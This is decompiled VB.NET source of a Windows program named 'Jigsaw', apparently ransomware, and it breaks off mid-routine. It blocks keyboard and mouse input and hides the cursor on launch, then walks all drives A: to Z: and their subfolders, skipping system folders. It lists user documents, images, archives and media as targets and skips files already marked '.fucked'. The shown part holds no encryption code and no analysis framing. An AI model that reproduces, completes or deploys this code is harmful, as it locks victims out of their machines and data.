Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.Security.Cryptography
Imports System.Windows.Forms
Imports Jigsaw.My
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices

Namespace Jigsaw
	' Token: 0x02000008 RID: 8
	<DesignerGenerated()>
	Public Partial Class Form1
		Inherits Form

		' Token: 0x06000014 RID: 20 RVA: 0x000020F8 File Offset: 0x000002F8
		Public Sub New()
			AddHandler MyBase.KeyDown, AddressOf Me.Form1_KeyDown
			AddHandler MyBase.Load, AddressOf Me.Form1_Load
			Me.InitializeComponent()
		End Sub

		' Token: 0x06000015 RID: 21
		Private Declare Ansi Function BlockInput Lib "user32" (fBlock As Integer) As Integer

		' Token: 0x06000016 RID: 22
		Private Declare Ansi Function ShowCursor Lib "user32" (lShow As Integer) As Integer

		' Token: 0x06000017 RID: 23 RVA: 0x0000212A File Offset: 0x0000032A
		Private Sub Form1_KeyDown(sender As Object, e As KeyEventArgs)
		End Sub

		' Token: 0x06000018 RID: 24 RVA: 0x00002834 File Offset: 0x00000A34
		Private Sub Form1_Load(sender As Object, e As EventArgs)
			Form1.BlockInput(1)
			Form1.ShowCursor(0)
			Try
				Try
					For Each text As String In MyProject.Computer.FileSystem.GetDirectories("A:\")
						If Not text.EndsWith("Bin") AndAlso Not text.EndsWith("indows") AndAlso Not text.EndsWith("tings") AndAlso Not text.EndsWith("System Volume Information") AndAlso Not text.EndsWith("cache") AndAlso Not text.EndsWith("very") AndAlso Not text.EndsWith("rogram Files (x86)") AndAlso Not text.EndsWith("rogram Files") AndAlso Not text.EndsWith("boot") AndAlso Not text.EndsWith("efi") AndAlso Not text.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text)
							Me.ListBox9.Items.Add(text)
						End If
					Next
				Finally
					Dim enumerator As IEnumerator(Of String)
					If enumerator IsNot Nothing Then
						enumerator.Dispose()
					End If
				End Try
			Catch ex As Exception
			End Try
			Try
				Try
					For Each text2 As String In MyProject.Computer.FileSystem.GetDirectories("B:\")
						If Not text2.EndsWith("Bin") AndAlso Not text2.EndsWith("indows") AndAlso Not text2.EndsWith("tings") AndAlso Not text2.EndsWith("System Volume Information") AndAlso Not text2.EndsWith("cache") AndAlso Not text2.EndsWith("very") AndAlso Not text2.EndsWith("rogram Files (x86)") AndAlso Not text2.EndsWith("rogram Files") AndAlso Not text2.EndsWith("boot") AndAlso Not text2.EndsWith("efi") AndAlso Not text2.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text2)
							Me.ListBox9.Items.Add(text2)
						End If
					Next
				Finally
					Dim enumerator2 As IEnumerator(Of String)
					If enumerator2 IsNot Nothing Then
						enumerator2.Dispose()
					End If
				End Try
			Catch ex2 As Exception
			End Try
			Try
				Try
					For Each text3 As String In MyProject.Computer.FileSystem.GetDirectories("C:\")
						If Not text3.EndsWith("Bin") AndAlso Not text3.EndsWith("indows") AndAlso Not text3.EndsWith("tings") AndAlso Not text3.EndsWith("System Volume Information") AndAlso Not text3.EndsWith("cache") AndAlso Not text3.EndsWith("very") AndAlso Not text3.EndsWith("rogram Files (x86)") AndAlso Not text3.EndsWith("rogram Files") AndAlso Not text3.EndsWith("boot") AndAlso Not text3.EndsWith("efi") AndAlso Not text3.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text3)
							Me.ListBox9.Items.Add(text3)
						End If
					Next
				Finally
					Dim enumerator3 As IEnumerator(Of String)
					If enumerator3 IsNot Nothing Then
						enumerator3.Dispose()
					End If
				End Try
			Catch ex3 As Exception
			End Try
			Try
				Try
					For Each text4 As String In MyProject.Computer.FileSystem.GetDirectories("D:\")
						If Not text4.EndsWith("Bin") AndAlso Not text4.EndsWith("indows") AndAlso Not text4.EndsWith("tings") AndAlso Not text4.EndsWith("System Volume Information") AndAlso Not text4.EndsWith("cache") AndAlso Not text4.EndsWith("very") AndAlso Not text4.EndsWith("rogram Files (x86)") AndAlso Not text4.EndsWith("rogram Files") AndAlso Not text4.EndsWith("boot") AndAlso Not text4.EndsWith("efi") AndAlso Not text4.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text4)
							Me.ListBox9.Items.Add(text4)
						End If
					Next
				Finally
					Dim enumerator4 As IEnumerator(Of String)
					If enumerator4 IsNot Nothing Then
						enumerator4.Dispose()
					End If
				End Try
			Catch ex4 As Exception
			End Try
			Try
				Try
					For Each text5 As String In MyProject.Computer.FileSystem.GetDirectories("E:\")
						If Not text5.EndsWith("Bin") AndAlso Not text5.EndsWith("indows") AndAlso Not text5.EndsWith("tings") AndAlso Not text5.EndsWith("System Volume Information") AndAlso Not text5.EndsWith("cache") AndAlso Not text5.EndsWith("very") AndAlso Not text5.EndsWith("rogram Files (x86)") AndAlso Not text5.EndsWith("rogram Files") AndAlso Not text5.EndsWith("boot") AndAlso Not text5.EndsWith("efi") AndAlso Not text5.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text5)
							Me.ListBox9.Items.Add(text5)
						End If
					Next
				Finally
					Dim enumerator5 As IEnumerator(Of String)
					If enumerator5 IsNot Nothing Then
						enumerator5.Dispose()
					End If
				End Try
			Catch ex5 As Exception
			End Try
			Try
				Try
					For Each text6 As String In MyProject.Computer.FileSystem.GetDirectories("F:\")
						If Not text6.EndsWith("Bin") AndAlso Not text6.EndsWith("indows") AndAlso Not text6.EndsWith("tings") AndAlso Not text6.EndsWith("System Volume Information") AndAlso Not text6.EndsWith("cache") AndAlso Not text6.EndsWith("very") AndAlso Not text6.EndsWith("rogram Files (x86)") AndAlso Not text6.EndsWith("rogram Files") AndAlso Not text6.EndsWith("boot") AndAlso Not text6.EndsWith("efi") AndAlso Not text6.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text6)
							Me.ListBox9.Items.Add(text6)
						End If
					Next
				Finally
					Dim enumerator6 As IEnumerator(Of String)
					If enumerator6 IsNot Nothing Then
						enumerator6.Dispose()
					End If
				End Try
			Catch ex6 As Exception
			End Try
			Try
				Try
					For Each text7 As String In MyProject.Computer.FileSystem.GetDirectories("G:\")
						If Not text7.EndsWith("Bin") AndAlso Not text7.EndsWith("indows") AndAlso Not text7.EndsWith("tings") AndAlso Not text7.EndsWith("System Volume Information") AndAlso Not text7.EndsWith("cache") AndAlso Not text7.EndsWith("very") AndAlso Not text7.EndsWith("rogram Files (x86)") AndAlso Not text7.EndsWith("rogram Files") AndAlso Not text7.EndsWith("boot") AndAlso Not text7.EndsWith("efi") AndAlso Not text7.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text7)
							Me.ListBox9.Items.Add(text7)
						End If
					Next
				Finally
					Dim enumerator7 As IEnumerator(Of String)
					If enumerator7 IsNot Nothing Then
						enumerator7.Dispose()
					End If
				End Try
			Catch ex7 As Exception
			End Try
			Try
				Try
					For Each text8 As String In MyProject.Computer.FileSystem.GetDirectories("H:\")
						If Not text8.EndsWith("Bin") AndAlso Not text8.EndsWith("indows") AndAlso Not text8.EndsWith("tings") AndAlso Not text8.EndsWith("System Volume Information") AndAlso Not text8.EndsWith("cache") AndAlso Not text8.EndsWith("very") AndAlso Not text8.EndsWith("rogram Files (x86)") AndAlso Not text8.EndsWith("rogram Files") AndAlso Not text8.EndsWith("boot") AndAlso Not text8.EndsWith("efi") AndAlso Not text8.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text8)
							Me.ListBox9.Items.Add(text8)
						End If
					Next
				Finally
					Dim enumerator8 As IEnumerator(Of String)
					If enumerator8 IsNot Nothing Then
						enumerator8.Dispose()
					End If
				End Try
			Catch ex8 As Exception
			End Try
			Try
				Try
					For Each text9 As String In MyProject.Computer.FileSystem.GetDirectories("I:\")
						If Not text9.EndsWith("Bin") AndAlso Not text9.EndsWith("indows") AndAlso Not text9.EndsWith("tings") AndAlso Not text9.EndsWith("System Volume Information") AndAlso Not text9.EndsWith("cache") AndAlso Not text9.EndsWith("very") AndAlso Not text9.EndsWith("rogram Files (x86)") AndAlso Not text9.EndsWith("rogram Files") AndAlso Not text9.EndsWith("boot") AndAlso Not text9.EndsWith("efi") AndAlso Not text9.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text9)
							Me.ListBox9.Items.Add(text9)
						End If
					Next
				Finally
					Dim enumerator9 As IEnumerator(Of String)
					If enumerator9 IsNot Nothing Then
						enumerator9.Dispose()
					End If
				End Try
			Catch ex9 As Exception
			End Try
			Try
				Try
					For Each text10 As String In MyProject.Computer.FileSystem.GetDirectories("J:\")
						If Not text10.EndsWith("Bin") AndAlso Not text10.EndsWith("indows") AndAlso Not text10.EndsWith("tings") AndAlso Not text10.EndsWith("System Volume Information") AndAlso Not text10.EndsWith("cache") AndAlso Not text10.EndsWith("very") AndAlso Not text10.EndsWith("rogram Files (x86)") AndAlso Not text10.EndsWith("rogram Files") AndAlso Not text10.EndsWith("boot") AndAlso Not text10.EndsWith("efi") AndAlso Not text10.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text10)
							Me.ListBox9.Items.Add(text10)
						End If
					Next
				Finally
					Dim enumerator10 As IEnumerator(Of String)
					If enumerator10 IsNot Nothing Then
						enumerator10.Dispose()
					End If
				End Try
			Catch ex10 As Exception
			End Try
			Try
				Try
					For Each text11 As String In MyProject.Computer.FileSystem.GetDirectories("K:\")
						If Not text11.EndsWith("Bin") AndAlso Not text11.EndsWith("indows") AndAlso Not text11.EndsWith("tings") AndAlso Not text11.EndsWith("System Volume Information") AndAlso Not text11.EndsWith("cache") AndAlso Not text11.EndsWith("very") AndAlso Not text11.EndsWith("rogram Files (x86)") AndAlso Not text11.EndsWith("rogram Files") AndAlso Not text11.EndsWith("boot") AndAlso Not text11.EndsWith("efi") AndAlso Not text11.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text11)
							Me.ListBox9.Items.Add(text11)
						End If
					Next
				Finally
					Dim enumerator11 As IEnumerator(Of String)
					If enumerator11 IsNot Nothing Then
						enumerator11.Dispose()
					End If
				End Try
			Catch ex11 As Exception
			End Try
			Try
				Try
					For Each text12 As String In MyProject.Computer.FileSystem.GetDirectories("L:\")
						If Not text12.EndsWith("Bin") AndAlso Not text12.EndsWith("indows") AndAlso Not text12.EndsWith("tings") AndAlso Not text12.EndsWith("System Volume Information") AndAlso Not text12.EndsWith("cache") AndAlso Not text12.EndsWith("very") AndAlso Not text12.EndsWith("rogram Files (x86)") AndAlso Not text12.EndsWith("rogram Files") AndAlso Not text12.EndsWith("boot") AndAlso Not text12.EndsWith("efi") AndAlso Not text12.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text12)
							Me.ListBox9.Items.Add(text12)
						End If
					Next
				Finally
					Dim enumerator12 As IEnumerator(Of String)
					If enumerator12 IsNot Nothing Then
						enumerator12.Dispose()
					End If
				End Try
			Catch ex12 As Exception
			End Try
			Try
				Try
					For Each text13 As String In MyProject.Computer.FileSystem.GetDirectories("M:\")
						If Not text13.EndsWith("Bin") AndAlso Not text13.EndsWith("indows") AndAlso Not text13.EndsWith("tings") AndAlso Not text13.EndsWith("System Volume Information") AndAlso Not text13.EndsWith("cache") AndAlso Not text13.EndsWith("very") AndAlso Not text13.EndsWith("rogram Files (x86)") AndAlso Not text13.EndsWith("rogram Files") AndAlso Not text13.EndsWith("boot") AndAlso Not text13.EndsWith("efi") AndAlso Not text13.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text13)
							Me.ListBox9.Items.Add(text13)
						End If
					Next
				Finally
					Dim enumerator13 As IEnumerator(Of String)
					If enumerator13 IsNot Nothing Then
						enumerator13.Dispose()
					End If
				End Try
			Catch ex13 As Exception
			End Try
			Try
				Try
					For Each text14 As String In MyProject.Computer.FileSystem.GetDirectories("N:\")
						If Not text14.EndsWith("Bin") AndAlso Not text14.EndsWith("indows") AndAlso Not text14.EndsWith("tings") AndAlso Not text14.EndsWith("System Volume Information") AndAlso Not text14.EndsWith("cache") AndAlso Not text14.EndsWith("very") AndAlso Not text14.EndsWith("rogram Files (x86)") AndAlso Not text14.EndsWith("rogram Files") AndAlso Not text14.EndsWith("boot") AndAlso Not text14.EndsWith("efi") AndAlso Not text14.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text14)
							Me.ListBox9.Items.Add(text14)
						End If
					Next
				Finally
					Dim enumerator14 As IEnumerator(Of String)
					If enumerator14 IsNot Nothing Then
						enumerator14.Dispose()
					End If
				End Try
			Catch ex14 As Exception
			End Try
			Try
				Try
					For Each text15 As String In MyProject.Computer.FileSystem.GetDirectories("O:\")
						If Not text15.EndsWith("Bin") AndAlso Not text15.EndsWith("indows") AndAlso Not text15.EndsWith("tings") AndAlso Not text15.EndsWith("System Volume Information") AndAlso Not text15.EndsWith("cache") AndAlso Not text15.EndsWith("very") AndAlso Not text15.EndsWith("rogram Files (x86)") AndAlso Not text15.EndsWith("rogram Files") AndAlso Not text15.EndsWith("boot") AndAlso Not text15.EndsWith("efi") AndAlso Not text15.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text15)
							Me.ListBox9.Items.Add(text15)
						End If
					Next
				Finally
					Dim enumerator15 As IEnumerator(Of String)
					If enumerator15 IsNot Nothing Then
						enumerator15.Dispose()
					End If
				End Try
			Catch ex15 As Exception
			End Try
			Try
				Try
					For Each text16 As String In MyProject.Computer.FileSystem.GetDirectories("P:\")
						If Not text16.EndsWith("Bin") AndAlso Not text16.EndsWith("indows") AndAlso Not text16.EndsWith("tings") AndAlso Not text16.EndsWith("System Volume Information") AndAlso Not text16.EndsWith("cache") AndAlso Not text16.EndsWith("very") AndAlso Not text16.EndsWith("rogram Files (x86)") AndAlso Not text16.EndsWith("rogram Files") AndAlso Not text16.EndsWith("boot") AndAlso Not text16.EndsWith("efi") AndAlso Not text16.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text16)
							Me.ListBox9.Items.Add(text16)
						End If
					Next
				Finally
					Dim enumerator16 As IEnumerator(Of String)
					If enumerator16 IsNot Nothing Then
						enumerator16.Dispose()
					End If
				End Try
			Catch ex16 As Exception
			End Try
			Try
				Try
					For Each text17 As String In MyProject.Computer.FileSystem.GetDirectories("Q:\")
						If Not text17.EndsWith("Bin") AndAlso Not text17.EndsWith("indows") AndAlso Not text17.EndsWith("tings") AndAlso Not text17.EndsWith("System Volume Information") AndAlso Not text17.EndsWith("cache") AndAlso Not text17.EndsWith("very") AndAlso Not text17.EndsWith("rogram Files (x86)") AndAlso Not text17.EndsWith("rogram Files") AndAlso Not text17.EndsWith("boot") AndAlso Not text17.EndsWith("efi") AndAlso Not text17.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text17)
							Me.ListBox9.Items.Add(text17)
						End If
					Next
				Finally
					Dim enumerator17 As IEnumerator(Of String)
					If enumerator17 IsNot Nothing Then
						enumerator17.Dispose()
					End If
				End Try
			Catch ex17 As Exception
			End Try
			Try
				Try
					For Each text18 As String In MyProject.Computer.FileSystem.GetDirectories("R:\")
						If Not text18.EndsWith("Bin") AndAlso Not text18.EndsWith("indows") AndAlso Not text18.EndsWith("tings") AndAlso Not text18.EndsWith("System Volume Information") AndAlso Not text18.EndsWith("cache") AndAlso Not text18.EndsWith("very") AndAlso Not text18.EndsWith("rogram Files (x86)") AndAlso Not text18.EndsWith("rogram Files") AndAlso Not text18.EndsWith("boot") AndAlso Not text18.EndsWith("efi") AndAlso Not text18.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text18)
							Me.ListBox9.Items.Add(text18)
						End If
					Next
				Finally
					Dim enumerator18 As IEnumerator(Of String)
					If enumerator18 IsNot Nothing Then
						enumerator18.Dispose()
					End If
				End Try
			Catch ex18 As Exception
			End Try
			Try
				Try
					For Each text19 As String In MyProject.Computer.FileSystem.GetDirectories("S:\")
						If Not text19.EndsWith("Bin") AndAlso Not text19.EndsWith("indows") AndAlso Not text19.EndsWith("tings") AndAlso Not text19.EndsWith("System Volume Information") AndAlso Not text19.EndsWith("cache") AndAlso Not text19.EndsWith("very") AndAlso Not text19.EndsWith("rogram Files (x86)") AndAlso Not text19.EndsWith("rogram Files") AndAlso Not text19.EndsWith("boot") AndAlso Not text19.EndsWith("efi") AndAlso Not text19.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text19)
							Me.ListBox9.Items.Add(text19)
						End If
					Next
				Finally
					Dim enumerator19 As IEnumerator(Of String)
					If enumerator19 IsNot Nothing Then
						enumerator19.Dispose()
					End If
				End Try
			Catch ex19 As Exception
			End Try
			Try
				Try
					For Each text20 As String In MyProject.Computer.FileSystem.GetDirectories("T:\")
						If Not text20.EndsWith("Bin") AndAlso Not text20.EndsWith("indows") AndAlso Not text20.EndsWith("tings") AndAlso Not text20.EndsWith("System Volume Information") AndAlso Not text20.EndsWith("cache") AndAlso Not text20.EndsWith("very") AndAlso Not text20.EndsWith("rogram Files (x86)") AndAlso Not text20.EndsWith("rogram Files") AndAlso Not text20.EndsWith("boot") AndAlso Not text20.EndsWith("efi") AndAlso Not text20.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text20)
							Me.ListBox9.Items.Add(text20)
						End If
					Next
				Finally
					Dim enumerator20 As IEnumerator(Of String)
					If enumerator20 IsNot Nothing Then
						enumerator20.Dispose()
					End If
				End Try
			Catch ex20 As Exception
			End Try
			Try
				Try
					For Each text21 As String In MyProject.Computer.FileSystem.GetDirectories("U:\")
						If Not text21.EndsWith("Bin") AndAlso Not text21.EndsWith("indows") AndAlso Not text21.EndsWith("tings") AndAlso Not text21.EndsWith("System Volume Information") AndAlso Not text21.EndsWith("cache") AndAlso Not text21.EndsWith("very") AndAlso Not text21.EndsWith("rogram Files (x86)") AndAlso Not text21.EndsWith("rogram Files") AndAlso Not text21.EndsWith("boot") AndAlso Not text21.EndsWith("efi") AndAlso Not text21.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text21)
							Me.ListBox9.Items.Add(text21)
						End If
					Next
				Finally
					Dim enumerator21 As IEnumerator(Of String)
					If enumerator21 IsNot Nothing Then
						enumerator21.Dispose()
					End If
				End Try
			Catch ex21 As Exception
			End Try
			Try
				Try
					For Each text22 As String In MyProject.Computer.FileSystem.GetDirectories("V:\")
						If Not text22.EndsWith("Bin") AndAlso Not text22.EndsWith("indows") AndAlso Not text22.EndsWith("tings") AndAlso Not text22.EndsWith("System Volume Information") AndAlso Not text22.EndsWith("cache") AndAlso Not text22.EndsWith("very") AndAlso Not text22.EndsWith("rogram Files (x86)") AndAlso Not text22.EndsWith("rogram Files") AndAlso Not text22.EndsWith("boot") AndAlso Not text22.EndsWith("efi") AndAlso Not text22.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text22)
							Me.ListBox9.Items.Add(text22)
						End If
					Next
				Finally
					Dim enumerator22 As IEnumerator(Of String)
					If enumerator22 IsNot Nothing Then
						enumerator22.Dispose()
					End If
				End Try
			Catch ex22 As Exception
			End Try
			Try
				Try
					For Each text23 As String In MyProject.Computer.FileSystem.GetDirectories("W:\")
						If Not text23.EndsWith("Bin") AndAlso Not text23.EndsWith("indows") AndAlso Not text23.EndsWith("tings") AndAlso Not text23.EndsWith("System Volume Information") AndAlso Not text23.EndsWith("cache") AndAlso Not text23.EndsWith("very") AndAlso Not text23.EndsWith("rogram Files (x86)") AndAlso Not text23.EndsWith("rogram Files") AndAlso Not text23.EndsWith("boot") AndAlso Not text23.EndsWith("efi") AndAlso Not text23.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text23)
							Me.ListBox9.Items.Add(text23)
						End If
					Next
				Finally
					Dim enumerator23 As IEnumerator(Of String)
					If enumerator23 IsNot Nothing Then
						enumerator23.Dispose()
					End If
				End Try
			Catch ex23 As Exception
			End Try
			Try
				Try
					For Each text24 As String In MyProject.Computer.FileSystem.GetDirectories("X:\")
						If Not text24.EndsWith("Bin") AndAlso Not text24.EndsWith("indows") AndAlso Not text24.EndsWith("tings") AndAlso Not text24.EndsWith("System Volume Information") AndAlso Not text24.EndsWith("cache") AndAlso Not text24.EndsWith("very") AndAlso Not text24.EndsWith("rogram Files (x86)") AndAlso Not text24.EndsWith("rogram Files") AndAlso Not text24.EndsWith("boot") AndAlso Not text24.EndsWith("efi") AndAlso Not text24.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text24)
							Me.ListBox9.Items.Add(text24)
						End If
					Next
				Finally
					Dim enumerator24 As IEnumerator(Of String)
					If enumerator24 IsNot Nothing Then
						enumerator24.Dispose()
					End If
				End Try
			Catch ex24 As Exception
			End Try
			Try
				Try
					For Each text25 As String In MyProject.Computer.FileSystem.GetDirectories("Y:\")
						If Not text25.EndsWith("Bin") AndAlso Not text25.EndsWith("indows") AndAlso Not text25.EndsWith("tings") AndAlso Not text25.EndsWith("System Volume Information") AndAlso Not text25.EndsWith("cache") AndAlso Not text25.EndsWith("very") AndAlso Not text25.EndsWith("rogram Files (x86)") AndAlso Not text25.EndsWith("rogram Files") AndAlso Not text25.EndsWith("boot") AndAlso Not text25.EndsWith("efi") AndAlso Not text25.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text25)
							Me.ListBox9.Items.Add(text25)
						End If
					Next
				Finally
					Dim enumerator25 As IEnumerator(Of String)
					If enumerator25 IsNot Nothing Then
						enumerator25.Dispose()
					End If
				End Try
			Catch ex25 As Exception
			End Try
			Try
				Try
					For Each text26 As String In MyProject.Computer.FileSystem.GetDirectories("Z:\")
						If Not text26.EndsWith("Bin") AndAlso Not text26.EndsWith("indows") AndAlso Not text26.EndsWith("tings") AndAlso Not text26.EndsWith("System Volume Information") AndAlso Not text26.EndsWith("cache") AndAlso Not text26.EndsWith("very") AndAlso Not text26.EndsWith("rogram Files (x86)") AndAlso Not text26.EndsWith("rogram Files") AndAlso Not text26.EndsWith("boot") AndAlso Not text26.EndsWith("efi") AndAlso Not text26.EndsWith(".old") Then
							Me.ListBox1.Items.Add(text26)
							Me.ListBox9.Items.Add(text26)
						End If
					Next
				Finally
					Dim enumerator26 As IEnumerator(Of String)
					If enumerator26 IsNot Nothing Then
						enumerator26.Dispose()
					End If
				End Try
			Catch ex26 As Exception
			End Try
			Me.Timer1.Start()
		End Sub

		' Token: 0x06000019 RID: 25 RVA: 0x00004BF4 File Offset: 0x00002DF4
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Me.ProgressBar1.Maximum = Me.ListBox1.Items.Count
			If Me.ProgressBar1.Value = Me.ListBox1.Items.Count Then
				Me.Timer1.[Stop]()
				Me.Timer2.Start()
			Else
				Me.ListBox1.SelectedIndex = Me.ProgressBar1.Value
				Me.ListBox1.SelectionMode = SelectionMode.One
				Me.filenamez = Conversions.ToString(Me.ListBox1.SelectedItem)
				Try
					Try
						For Each text As String In MyProject.Computer.FileSystem.GetDirectories(Me.filenamez)
							Me.ListBox2.Items.Add(text)
							Me.ListBox9.Items.Add(text)
						Next
					Finally
						Dim enumerator As IEnumerator(Of String)
						If enumerator IsNot Nothing Then
							enumerator.Dispose()
						End If
					End Try
				Catch ex As Exception
				End Try
				Me.ProgressBar1.Increment(1)
			End If
		End Sub

		' Token: 0x0600001A RID: 26 RVA: 0x00004D24 File Offset: 0x00002F24
		Private Sub Timer2_Tick(sender As Object, e As EventArgs)
			Me.ProgressBar2.Maximum = Me.ListBox2.Items.Count
			If Me.ProgressBar2.Value = Me.ListBox2.Items.Count Then
				Me.Timer2.[Stop]()
				Me.Timer3.Start()
			Else
				Me.ListBox2.SelectedIndex = Me.ProgressBar2.Value
				Me.ListBox2.SelectionMode = SelectionMode.One
				Me.filenamez = Conversions.ToString(Me.ListBox2.SelectedItem)
				Try
					Try
						For Each text As String In MyProject.Computer.FileSystem.GetDirectories(Me.filenamez)
							Me.ListBox3.Items.Add(text)
							Me.ListBox9.Items.Add(text)
						Next
					Finally
						Dim enumerator As IEnumerator(Of String)
						If enumerator IsNot Nothing Then
							enumerator.Dispose()
						End If
					End Try
				Catch ex As Exception
				End Try
				Me.ProgressBar2.Increment(1)
			End If
		End Sub

		' Token: 0x0600001B RID: 27 RVA: 0x00004E54 File Offset: 0x00003054
		Private Sub Timer3_Tick(sender As Object, e As EventArgs)
			Me.ProgressBar3.Maximum = Me.ListBox3.Items.Count
			If Me.ProgressBar3.Value = Me.ListBox3.Items.Count Then
				Me.Timer3.[Stop]()
				Me.Timer4.Start()
			Else
				Me.ListBox3.SelectedIndex = Me.ProgressBar3.Value
				Me.ListBox3.SelectionMode = SelectionMode.One
				Me.filenamez = Conversions.ToString(Me.ListBox3.SelectedItem)
				Try
					Try
						For Each text As String In MyProject.Computer.FileSystem.GetDirectories(Me.filenamez)
							Me.ListBox4.Items.Add(text)
							Me.ListBox9.Items.Add(text)
						Next
					Finally
						Dim enumerator As IEnumerator(Of String)
						If enumerator IsNot Nothing Then
							enumerator.Dispose()
						End If
					End Try
				Catch ex As Exception
				End Try
				Me.ProgressBar3.Increment(1)
			End If
		End Sub

		' Token: 0x0600001C RID: 28 RVA: 0x00004F84 File Offset: 0x00003184
		Private Sub Timer4_Tick(sender As Object, e As EventArgs)
			Me.ProgressBar4.Maximum = Me.ListBox4.Items.Count
			If Me.ProgressBar4.Value = Me.ListBox4.Items.Count Then
				Me.Timer4.[Stop]()
				Me.Timer5.Start()
			Else
				Me.ListBox4.SelectedIndex = Me.ProgressBar4.Value
				Me.ListBox4.SelectionMode = SelectionMode.One
				Me.filenamez = Conversions.ToString(Me.ListBox4.SelectedItem)
				Try
					Try
						For Each text As String In MyProject.Computer.FileSystem.GetDirectories(Me.filenamez)
							Me.ListBox5.Items.Add(text)
							Me.ListBox9.Items.Add(text)
						Next
					Finally
						Dim enumerator As IEnumerator(Of String)
						If enumerator IsNot Nothing Then
							enumerator.Dispose()
						End If
					End Try
				Catch ex As Exception
				End Try
				Me.ProgressBar4.Increment(1)
			End If
		End Sub

		' Token: 0x0600001D RID: 29 RVA: 0x000050B4 File Offset: 0x000032B4
		Private Sub Timer5_Tick(sender As Object, e As EventArgs)
			Me.ProgressBar5.Maximum = Me.ListBox5.Items.Count
			If Me.ProgressBar5.Value = Me.ListBox5.Items.Count Then
				Me.Timer5.[Stop]()
				Me.Timer6.Start()
			Else
				Me.ListBox5.SelectedIndex = Me.ProgressBar5.Value
				Me.ListBox5.SelectionMode = SelectionMode.One
				Me.filenamez = Conversions.ToString(Me.ListBox5.SelectedItem)
				Try
					Try
						For Each text As String In MyProject.Computer.FileSystem.GetDirectories(Me.filenamez)
							Me.ListBox6.Items.Add(text)
							Me.ListBox9.Items.Add(text)
						Next
					Finally
						Dim enumerator As IEnumerator(Of String)
						If enumerator IsNot Nothing Then
							enumerator.Dispose()
						End If
					End Try
				Catch ex As Exception
				End Try
				Me.ProgressBar5.Increment(1)
			End If
		End Sub

		' Token: 0x0600001E RID: 30 RVA: 0x000051E4 File Offset: 0x000033E4
		Private Sub Timer6_Tick(sender As Object, e As EventArgs)
			Me.ProgressBar6.Maximum = Me.ListBox6.Items.Count
			If Me.ProgressBar6.Value = Me.ListBox6.Items.Count Then
				Me.Timer6.[Stop]()
				Me.Timer7.Start()
			Else
				Me.ListBox6.SelectedIndex = Me.ProgressBar6.Value
				Me.ListBox6.SelectionMode = SelectionMode.One
				Me.filenamez = Conversions.ToString(Me.ListBox6.SelectedItem)
				Try
					Try
						For Each text As String In MyProject.Computer.FileSystem.GetDirectories(Me.filenamez)
							Me.ListBox7.Items.Add(text)
							Me.ListBox9.Items.Add(text)
						Next
					Finally
						Dim enumerator As IEnumerator(Of String)
						If enumerator IsNot Nothing Then
							enumerator.Dispose()
						End If
					End Try
				Catch ex As Exception
				End Try
				Me.ProgressBar6.Increment(1)
			End If
		End Sub

		' Token: 0x0600001F RID: 31 RVA: 0x00005314 File Offset: 0x00003514
		Private Sub Timer7_Tick(sender As Object, e As EventArgs)
			Me.ProgressBar7.Maximum = Me.ListBox9.Items.Count
			If Me.ProgressBar7.Value = Me.ListBox9.Items.Count Then
				Me.Timer7.[Stop]()
				Me.Timer8.Start()
			Else
				Me.ListBox9.SelectedIndex = Me.ProgressBar7.Value
				Me.ListBox9.SelectionMode = SelectionMode.One
				Me.filenamez = Conversions.ToString(Me.ListBox9.SelectedItem)
				Try
					Try
						For Each text As String In MyProject.Computer.FileSystem.GetFiles(Me.filenamez)
							If Not text.EndsWith(".fucked") Then
								If text.EndsWith(".doc") Then
									Me.ListBox8.Items.Add(text)
								ElseIf text.EndsWith(".docx") Then
									Me.ListBox8.Items.Add(text)
								ElseIf text.EndsWith(".xls") Then
									Me.ListBox8.Items.Add(text)
								ElseIf text.EndsWith(".xlsx") Then
									Me.ListBox8.Items.Add(text)
								ElseIf text.EndsWith(".ppt") Then
									Me.ListBox8.Items.Add(text)
								ElseIf text.EndsWith(".pptx") Then
									Me.ListBox8.Items.Add(text)
								ElseIf text.EndsWith(".jpg") Then
									Me.ListBox8.Items.Add(text)
								ElseIf text.EndsWith(".jpeg") Then
									Me.ListBox8.Items.Add(text)
								ElseIf text.EndsWith(".png") Then
									Me.ListBox8.Items.Add(text)
								ElseIf text.EndsWith(".psd") Then
									Me.ListBox8.Items.Add(text)
								ElseIf text.EndsWith(".txt") Then
									Me.ListBox8.Items.Add(text)
								ElseIf text.EndsWith(".zip") Then
									Me.ListBox8.Items.Add(text)
								ElseIf text.EndsWith(".rar") Then
									Me.ListBox8.Items.Add(text)
								ElseIf text.EndsWith(".html") Then
									Me.ListBox8.Items.Add(text)
								ElseIf text.EndsWith(".php") Then
									Me.ListBox8.Items.Add(text)
								ElseIf text.EndsWith(".asp") Then
									Me.ListBox8.Items.Add(text)
								ElseIf text.EndsWith(".aspx") Then
									Me.ListBox8.Items.Add(text)
								ElseIf text.EndsWith(".mp4") Then
									Me.ListBox8.Items.Add(text)
								ElseIf text.EndsWith(".avi") Then
